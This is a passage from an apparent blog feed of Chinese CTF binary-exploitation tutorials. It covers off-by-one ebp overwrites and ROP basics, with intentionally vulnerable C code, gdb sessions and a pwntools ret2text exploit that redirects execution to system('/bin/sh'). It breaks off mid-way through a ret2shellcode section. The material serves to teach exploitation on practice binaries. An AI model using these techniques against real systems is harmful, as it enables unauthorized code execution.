class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;string.h&gt;</span></span><br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">foo</span><span class=\"hljs-params\">(<span class=\"hljs-type\">char</span>* arg)</span>;<br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">bar</span><span class=\"hljs-params\">(<span class=\"hljs-type\">char</span>* arg)</span>;<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">foo</span><span class=\"hljs-params\">(<span class=\"hljs-type\">char</span>* arg)</span> {<br> bar(arg); <span class=\"hljs-comment\">/* [1] */</span><br>}<br><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">bar</span><span class=\"hljs-params\">(<span class=\"hljs-type\">char</span>* arg)</span> {<br> <span class=\"hljs-type\">char</span> buf[<span class=\"hljs-number\">256</span>];<br> <span class=\"hljs-built_in\">strcpy</span>(buf, arg); <span class=\"hljs-comment\">/* [2] */</span><br>}<br><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">char</span> *argv[])</span> {<br> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-built_in\">strlen</span>(argv[<span class=\"hljs-number\">1</span>])&gt;<span class=\"hljs-number\">256</span>) { <span class=\"hljs-comment\">/* [3] */</span><br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Attempted Buffer Overflow\\n\"</span>);<br>  fflush(<span class=\"hljs-built_in\">stdout</span>);<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br> }<br> foo(argv[<span class=\"hljs-number\">1</span>]); <span class=\"hljs-comment\">/* [4] */</span><br> <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\t<strong>当目标缓冲区大小与写入长度相一致时，会出现单字节溢出</strong>，因为在strcpy的处理过程中，将传入的参数都视为视为是字符串，默认会在复制过后在末尾添加一个字节的0x00，因此会向buffer的第256个位置处写0x00。\t</p>\n<p>​\t该操作会向下一个位置中写入0x00，下一个位置有可能就是ebp的存储位置，其实也就是栈区基地址。但是只能更改一个字节，其实也就是ebp指针的最低字节，当前过程在退出的过程中，执行leave指令，会将被修改后的ebp写入到寄存器中。</p>\n<p>​\t<strong>栈基址</strong>的高位迁移。由于只能向ebp的低字节中写入一个0，也就是稳定会将ebp抬高，从而更改栈的位置。当前ebp的较高位置其实就是用于存放当前函数临时变量的位置，其实也就控制了栈。在上述例子中，在foo函数中完成了栈的抬升，将栈设置到可控区域中。在main函数退出时就会取出错误的返回地址return，进行间接的控制流劫持操作。</p>\n<h3 id=\"栈迁移不可用的情况\"><a href=\"#栈迁移不可用的情况\" class=\"headerlink\" title=\"栈迁移不可用的情况\"></a>栈迁移不可用的情况</h3><ul>\n<li><p><strong>单字节溢出无法影响ebp</strong>：如果本身当前的缓冲区在ebp之上，但是并不能</p>\n</li>\n<li><p><strong>栈基地址的低位本身就是0x00</strong>：</p>\n</li>\n<li><p><strong>程序本身存在16字节对齐的情况</strong>：其实默认情况下gcc编译器都会对程序进行16字节的对齐，因此在创建堆栈空间之前会将esp的最后四个位进行清零操作。（因为最后四位正好是表示16个字节</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">0x08048497 &lt;+0&gt;: push %ebp<br>0x08048498 &lt;+1&gt;: mov %esp,%ebp<br>0x0804849a &lt;+3&gt;: push %edi<br>0x0804849b &lt;+4&gt;: and $0xfffffff0,%esp               //Stack space aligned to 16 byte boundary<br>0x0804849e &lt;+7&gt;: sub $0x20,%esp   <br></code></pre></td></tr></tbody></table></figure></li>\n</ul>\n<p>关于栈迁移请参考该位置<a href=\"https://alazymechnaic.github.io/2023/05/02/bypass-nx/\">https://alazymechnaic.github.io/2023/05/02/bypass-nx/</a></p>\n",
            "tags": [
                "binary"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/04/26/zhan-yi-chu-lou-dong-li-yong/",
            "url": "https://alazymechnaic.github.io/2023/04/26/zhan-yi-chu-lou-dong-li-yong/",
            "title": "栈溢出漏洞利用",
            "date_published": "2023-04-26T03:17:43.000Z",
            "content_html": "<p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>\n</ul>\n<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>\n<h2 id=\"ret2text¶\"><a href=\"#ret2text¶\" class=\"headerlink\" title=\"ret2text¶\"></a>ret2text<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2text\">¶</a></h2><h3 id=\"原理-¶\"><a href=\"#原理-¶\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_1\">¶</a></h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>\n<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>\n<h3 id=\"例子-¶\"><a href=\"#例子-¶\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_2\">¶</a></h3><p>其实，在栈溢出的基本原理中，我们已经介绍了这一简单的攻击。在这里，我们再给出另外一个例子，bamboofox 中介绍 ROP 时使用的 ret2text 的例子。</p>\n<p>点击下载: <a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text\">ret2text</a></p>\n<p>首先，查看一下程序的保护机制</p>\n<figure class=\"highlight yaml\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">ret2text</span> <span class=\"hljs-string\">checksec</span> <span class=\"hljs-string\">ret2text</span><br>    <span class=\"hljs-attr\">Arch:</span>     <span class=\"hljs-string\">i386-32-little</span><br>    <span class=\"hljs-attr\">RELRO:</span>    <span class=\"hljs-string\">Partial</span> <span class=\"hljs-string\">RELRO</span><br>    <span class=\"hljs-attr\">Stack:</span>    <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">canary</span> <span class=\"hljs-string\">found</span><br>    <span class=\"hljs-attr\">NX:</span>       <span class=\"hljs-string\">NX</span> <span class=\"hljs-string\">enabled</span><br>    <span class=\"hljs-attr\">PIE:</span>      <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">PIE</span> <span class=\"hljs-string\">(0x8048000)</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出程序是 32 位程序，其仅仅开启了栈不可执行保护。然后，我们使用 IDA 来查看源代码。</p>\n<figure class=\"highlight cpp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> __cdecl <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **argv, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **envp)</span></span><br><span class=\"hljs-function\"></span>{<br>  <span class=\"hljs-type\">int</span> v4; <span class=\"hljs-comment\">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class=\"hljs-built_in\">setvbuf</span>(stdout, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">setvbuf</span>(_bss_start, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"There is something amazing here, do you know anything?\"</span>);<br>  <span class=\"hljs-built_in\">gets</span>((<span class=\"hljs-type\">char</span> *)&amp;v4);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Maybe I will tell you next time !\"</span>);<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出程序在主函数中使用了 gets 函数，显然存在栈溢出漏洞。此后又发现</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.text:080485FD secure          proc near<br>.text:080485FD<br>.text:080485FD input           = dword ptr -10h<br>.text:080485FD secretcode      = dword ptr -0Ch<br>.text:080485FD<br>.text:080485FD                 push    ebp<br>.text:080485FE                 mov     ebp, esp<br>.text:08048600                 sub     esp, 28h<br>.text:08048603                 mov     dword ptr [esp], 0 ; timer<br>.text:0804860A                 call    _time<br>.text:0804860F                 mov     [esp], eax      ; seed<br>.text:08048612                 call    _srand<br>.text:08048617                 call    _rand<br>.text:0804861C                 mov     [ebp+secretcode], eax<br>.text:0804861F                 lea     eax, [ebp+input]<br>.text:08048622                 mov     [esp+4], eax<br>.text:08048626                 mov     dword ptr [esp], offset unk_8048760<br>.text:0804862D                 call    ___isoc99_scanf<br>.text:08048632                 mov     eax, [ebp+input]<br>.text:08048635                 cmp     eax, [ebp+secretcode]<br>.text:08048638                 jnz     short locret_8048646<br>.text:0804863A                 mov     dword ptr [esp], offset command ; \"/bin/sh\"<br>.text:08048641                 call    _system<br></code></pre></td></tr></tbody></table></figure>\n\n<p>在 secure 函数又发现了存在调用 system(“/bin/sh”) 的代码，那么如果我们直接控制程序返回至 0x0804863A，那么就可以得到系统的 shell 了。</p>\n<p>下面就是我们如何构造 payload 了，首先需要确定的是我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。</p>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.text:080486A7                 lea     eax, [esp+1Ch]<br>.text:080486AB                 mov     [esp], eax      ; s<br>.text:080486AE                 call    _gets<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看到该字符串是通过相对于 esp 的索引，所以我们需要进行调试，将断点下在 call 处，查看 esp，ebp，如下</p>\n<figure class=\"highlight x86asm\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs x86asm\">gef➤  b *<span class=\"hljs-number\">0x080486AE</span><br>Breakpoint <span class=\"hljs-number\">1</span> <span class=\"hljs-meta\">at</span> <span class=\"hljs-number\">0x80486ae</span>: file ret2text<span class=\"hljs-number\">.</span>c, line <span class=\"hljs-number\">24</span>.<br>gef➤  r<br>There is something amazing here, <span class=\"hljs-built_in\">do</span> you know anything?<br><br>Breakpoint <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0x080486ae</span> <span class=\"hljs-keyword\">in</span> main () <span class=\"hljs-meta\">at</span> ret2text<span class=\"hljs-number\">.</span>c:<span class=\"hljs-number\">24</span><br><span class=\"hljs-number\">24</span>      gets(buf)<span class=\"hljs-comment\">;</span><br>───────────────────────────────────────────────────────────────────────[ registers ]────<br>$<span class=\"hljs-built_in\">eax</span>   : <span class=\"hljs-number\">0xffffcd5c</span>  →  <span class=\"hljs-number\">0x08048329</span>  →  <span class=\"hljs-string\">\"__libc_start_main\"</span><br>$<span class=\"hljs-built_in\">ebx</span>   : <span class=\"hljs-number\">0x00000000</span><br>$<span class=\"hljs-built_in\">ecx</span>   : <span class=\"hljs-number\">0xffffffff</span><br>$<span class=\"hljs-built_in\">edx</span>   : <span class=\"hljs-number\">0xf7faf870</span>  →  <span class=\"hljs-number\">0x00000000</span><br>$<span class=\"hljs-built_in\">esp</span>   : <span class=\"hljs-number\">0xffffcd40</span>  →  <span class=\"hljs-number\">0xffffcd5c</span>  →  <span class=\"hljs-number\">0x08048329</span>  →  <span class=\"hljs-string\">\"__libc_start_main\"</span><br>$<span class=\"hljs-built_in\">ebp</span>   : <span class=\"hljs-number\">0xffffcdc8</span>  →  <span class=\"hljs-number\">0x00000000</span><br>$<span class=\"hljs-built_in\">esi</span>   : <span class=\"hljs-number\">0xf7fae000</span>  →  <span class=\"hljs-number\">0x001b1db0</span><br>$<span class=\"hljs-built_in\">edi</span>   : <span class=\"hljs-number\">0xf7fae000</span>  →  <span class=\"hljs-number\">0x001b1db0</span><br>$<span class=\"hljs-built_in\">eip</span>   : <span class=\"hljs-number\">0x080486ae</span>  →  &lt;main+<span class=\"hljs-number\">102</span>&gt; <span class=\"hljs-keyword\">call</span> <span class=\"hljs-number\">0x8048460</span> &lt;gets@plt&gt;<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看到 esp 为 0xffffcd40，ebp 为 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断</p>\n<ul>\n<li>s 的地址为 0xffffcd5c</li>\n<li>s 相对于 ebp 的偏移为 0x6c</li>\n<li>s 相对于返回地址的偏移为 0x6c+4</li>\n</ul>\n<p>最后的 payload 如下：</p>\n<figure class=\"highlight clean\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">##!/usr/bin/env python<br><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><br>sh = process(<span class=\"hljs-string\">'./ret2text'</span>)<br>target = <span class=\"hljs-number\">0x804863a</span><br>sh.sendline(<span class=\"hljs-string\">'A'</span> * (<span class=\"hljs-number\">0x6c</span>+<span class=\"hljs-number\">4</span>) + p32(target))<br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"ret2shellcode¶\"><a href=\"#ret2shellcode¶\" class=\"headerlink\" title=\"ret2shellcode¶\"></a>ret2shellcode<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode\">¶</a></h2><h3 id=\"原理-¶-1\"><a href=\"#原理-¶-1\" class=\"headerlink\" title=\"原理 ¶\"></a>原理 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_3\">¶</a></h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>\n<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>\n<h3 id=\"例子-¶-1\"><a href=\"#例子-¶-1\" class=\"headerlink\" title=\"例子 ¶\"></a>例子 <a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_4\">¶</a></h3><p>这里我们以 bamboofox 中的 ret2shellcode 为例</p>\n<p>点击下载: <a href=\"https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode\">ret2shellcode</a></p>\n<p>首先检测程序开启的保护</p>\n<figure class=\"highlight yaml\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs yaml\"><span class=\"hljs-string\">➜</span>  <span class=\"hljs-string\">ret2shellcode</span> <span class=\"hljs-string\">checksec</span> <span class=\"hljs-string\">ret2shellcode</span><br>    <span class=\"hljs-attr\">Arch:</span>     <span class=\"hljs-string\">i386-32-little</span><br>    <span class=\"hljs-attr\">RELRO:</span>    <span class=\"hljs-string\">Partial</span> <span class=\"hljs-string\">RELRO</span><br>    <span class=\"hljs-attr\">Stack:</span>    <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">canary</span> <span class=\"hljs-string\">found</span><br>    <span class=\"hljs-attr\">NX:</span>       <span class=\"hljs-string\">NX</span> <span class=\"hljs-string\">disabled</span><br>    <span class=\"hljs-attr\">PIE:</span>      <span class=\"hljs-literal\">No</span> <span class=\"hljs-string\">PIE</span> <span class=\"hljs-string\">(0x8048000)</span><br>    <span class=\"hljs-attr\">RWX:</span>      <span class=\"hljs-string\">Has</span> <span class=\"hljs-string\">RWX</span> <span class=\"hljs-string\">segments</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用 IDA 看一下程序</p>\n<figure class=\"highlight cpp\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs cpp\"><span class=\"hljs-function\"><span class=\"hljs-type\">int</span> __cdecl <span class=\"hljs-title\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> argc, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **argv, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> **envp)</span></span><br><span class=\"hljs-function\"></span>{<br>  <span class=\"hljs-type\">int</span> v4; <span class=\"hljs-comment\">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class=\"hljs-built_in\">setvbuf</span>(stdout, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">setvbuf</span>(stdin, <span class=\"hljs-number\">0</span>, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>);<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"No system for you this time !!!\"</span>);<br>  <span class=\"hljs-built_in\">gets</span>((<span class=\"hljs-type\">char</span> *)&amp;v4);<br>  <span class=\"hljs-built_in\">strncpy</span>(buf2, (<span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *)&amp;v4, <span class=\"hljs-number\">0x64</span>u);<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"bye bye ~\"</span>);<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>\n<figure class=\"highlight arduino\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arduino\">.bss:<span class=\"hljs-number\">0804</span>A080                 <span class=\"hljs-keyword\">public</span> buf2<br>.bss:<span class=\"hljs-number\">0804</span>A080 ; <span class=\"hljs-type\">char</span> buf2[<span class=\"hljs-number\">100</span>]<br></code></pre></td></tr></tbody></table></figure>\n\n<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>\n<figure class=\"highlight gradle\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">gef➤  b main<br>Breakpoint <span class=\"hljs-number\">1</span> at <span class=\"hljs-number\">0</span>x8048536: <span class=\"hljs-keyword\">file</span> ret2shellcode.c, line <span class=\"hljs-number\">8</span>.<br>gef➤  r<br>Starting program: <span class=\"hljs-regexp\">/mnt/</span>hgfs<span class=\"hljs-regexp\">/Hack/</span>CTF-Learn<span class=\"hljs-regexp\">/pwn/</span>stack<span class=\"hljs-regexp\">/example/</span>ret2shellcode/ret2shellcode <br><br>Breakpoint <span class=\"hljs-number\">1</span>, main () at ret2shellcode.c:<span class=\"hljs-number\">8</span><br><span class=\"hljs-number\">8</span>       setvbuf(stdout, <span class=\"hljs-number\">0</span>LL, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>LL);<br>─────────────────────────────────────────────────────────────────────[ <span class=\"hljs-keyword\">source</span>:ret2shellcode.c+<span class=\"hljs-number\">8</span> ]────<br>      <span class=\"hljs-number\">6</span>  <span class=\"hljs-keyword\">int</span> main(<span class=\"hljs-keyword\">void</span>)<br>      <span class=\"hljs-number\">7</span>  {<br> →    <span class=\"hljs-number\">8</span>      setvbuf(stdout, <span class=\"hljs-number\">0</span>LL, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">0</span>LL);<br>      <span class=\"hljs-number\">9</span>      setvbuf(stdin, <span class=\"hljs-number\">0</span>LL, <span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">0</span>LL);<br>     <span class=\"hljs-number\">10</span>  <br>─────────────────────────────────────────────────────────────────────[ trace ]────<br>[#<span class=\"hljs-number\">0</span>] <span class=\"hljs-number\">0</span>x8048536 → Name: main()<br>─────────────────────────────────────────────────────────────────────────────────────────────────────<br>gef➤  vmmap <br>Start      End        Offset     Perm Path<br><span class=\"hljs-number\">0</span>x08048000 <span class=\"hljs-number\">0</span>x08049000 <span class=\"hljs-number\">0</span>x00000000 r-x <span class=\"hljs-regexp\">/mnt/</span>hgfs<span class=\"hljs-regexp\">/Hack/</span>CTF-Learn<span class=\"hljs-regexp\">/pwn/</span>stack<span class=\"hljs-regexp\">/example/</span>ret2shellcode/ret2shellcode<br><span class=\"hljs-number\">0</span>x08049000 <span class=\"hljs-number\">0</span>x0804a000 <span class=\"hljs-number\">0</span>x00000000 r-x <span class=\"hljs-regexp\">/mnt/</span>hgfs<span class=\"hljs-regexp\">/Hack/</span>CTF-Learn<span class=\"hljs-regexp\">/pwn/</span>stack<span class=\"hljs-regexp\">/example/</span>ret2shellcode/ret2shellcode<br><span class=\"hljs-number\">0</span>x0804a000 <span class=\"hljs-number\">0</span>x0804b000 <span class=\"hljs-number\">0</span>x00001000 rwx <span class=\"hljs-regexp\">/mnt/</span>hgfs<span class=\"hljs-regexp\">/Hack/</span>CTF-Learn<span class=\"hljs-regexp\">/pwn/</span>stack<span class=\"hljs-regexp\">/example/</span>ret2shellcode/ret2shellcode<br><span class=\"hljs-number\">0</span>xf7dfc000 <span class=\"hljs-number\">0</span>xf7fab000 <span class=\"hljs-number\">0</span>x00000000 r-x <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/libc-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xf7fab000 <span class=\"hljs-number\">0</span>xf7fac000 <span class=\"hljs-number\">0</span>x001af000 --- <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/libc-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xf7fac000 <span class=\"hljs-number\">0</span>xf7fae000 <span class=\"hljs-number\">0</span>x001af000 r-x <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/libc-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xf7fae000 <span class=\"hljs-number\">0</span>xf7faf000 <span class=\"hljs-number\">0</span>x001b1000 rwx <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/libc-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xf7faf000 <span class=\"hljs-number\">0</span>xf7fb2000 <span class=\"hljs-number\">0</span>x00000000 rwx <br><span class=\"hljs-number\">0</span>xf7fd3000 <span class=\"hljs-number\">0</span>xf7fd5000 <span class=\"hljs-number\">0</span>x00000000 rwx <br><span class=\"hljs-number\">0</span>xf7fd5000 <span class=\"hljs-number\">0</span>xf7fd7000 <span class=\"hljs-number\">0</span>x00000000 r-- [vvar]<br><span class=\"hljs-number\">0</span>xf7fd7000 <span class=\"hljs-number\">0</span>xf7fd9000 <span class=\"hljs-number\">0</span>x00000000 r-x [vdso]<br><span class=\"hljs-number\">0</span>xf7fd9000 <span class=\"hljs-number\">0</span>xf7ffb000 <span class=\"hljs-number\">0</span>x00000000 r-x <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/ld-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xf7ffb000 <span class=\"hljs-number\">0</span>xf7ffc000 <span class=\"hljs-number\">0</span>x00000000 rwx <br><span class=\"hljs-number\">0</span>xf7ffc000 <span class=\"hljs-number\">0</span>xf7ffd000 <span class=\"hljs-number\">0</span>x00022000 r-x <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/ld-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xf7ffd000 <span class=\"hljs-number\">0</span>xf7ffe000 <span class=\"hljs-number\">0</span>x00023000 rwx <span class=\"hljs-regexp\">/lib/i</span>386-linux-gnu/ld-<span class=\"hljs-number\">2.23</span>.so<br><span class=\"hljs-number\">0</span>xfffdd000 <span class=\"hljs-number\">0</span>xffffe000 <span class=\"hljs-number\">0</span>x00000000 rwx [stack]<br></code></pre></td></tr></tbody></table></figure>\n\n<p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>\n<figure class=\"highlight awk\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-number\">0</span>x0804a000 <span 